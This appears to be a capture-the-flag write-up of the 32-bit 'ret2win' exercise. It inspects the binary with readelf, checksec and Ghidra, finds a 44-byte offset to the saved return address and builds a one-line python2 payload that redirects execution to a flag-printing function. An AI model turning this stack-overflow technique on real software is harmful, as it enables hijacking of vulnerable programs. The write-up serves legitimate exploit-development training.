## Description:
> Locate a method that you want to call within the binary. Call it by overwriting a saved return address on the stack.
## Write-up:
`ret2win32` binary is a standard Intel 32-bit ELF.
```bash
$ file ret2win32
ret2win32: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=e1596c11f85b3ed0881193fe40783e1da685b851, not stripped

```
`readelf` shows a couple of suspiciously named functions, being `pwnme` and `ret2win`:
```bash
$ readelf ret2win32 -Ws | grep FUNC
...
    36: 080485ad   127 FUNC    LOCAL  DEFAULT   14 pwnme
    37: 0804862c    41 FUNC    LOCAL  DEFAULT   14 ret2win
...
```
`checksec` shows `NX` bit is set for the binary and `PIE` is off:
```bash
$ checksec --file=ret2win32
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   72 Symbols        No    0               3               ret2win32
```
Opening this binary up in Ghidra shows `main` calls `pwnme`, which looks like:
```c
void pwnme(void)
{
  undefined local_2c [40];
  memset(local_2c,0,0x20);
  puts(
      "For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffe r!"
      );
  puts("What could possibly go wrong?");
  puts(
      "You there, may I have your input please? And don\'t worry about null bytes, we\'re using read ()!\n"
      );
  printf("> ");
  read(0,local_2c,0x38);
  puts("Thank you!");
  return;
}
```
And `ret2win` looks like:
```c
void ret2win(void)
{
  puts("Well done! Here\'s your flag:");
  system("/bin/cat flag.txt");
  return;
}
```
So to win, I need to cause a buffer overflow in `pwnme` to change the return address to `ret2win`.
![[Pasted image 20231215170018.png]]
![[Pasted image 20231215170103.png]]
Using `gdb-peda`'s pattern functionality, I have found that the offset from the buffer to the functions return address is 44 bytes.
Now, I need the address of ret2win:
```bash
gdb-peda$ p ret2win
$1 = {<text variable, no debug info>} 0x804862c <ret2win>
```
So `0x0804862c` is the address of `ret2win`. I'll now use the gathered information to build a payload.
```bash
python2 -c 'print "\x00"*44 + "\x2c\x86\x04\x08"' > payload.txt
```
Now to throw the exploit:
![[Pasted image 20231215171642.png]]
As shown in the above picture, the exploit was successful, and the program executed the `ret2win` function which prints the "flag".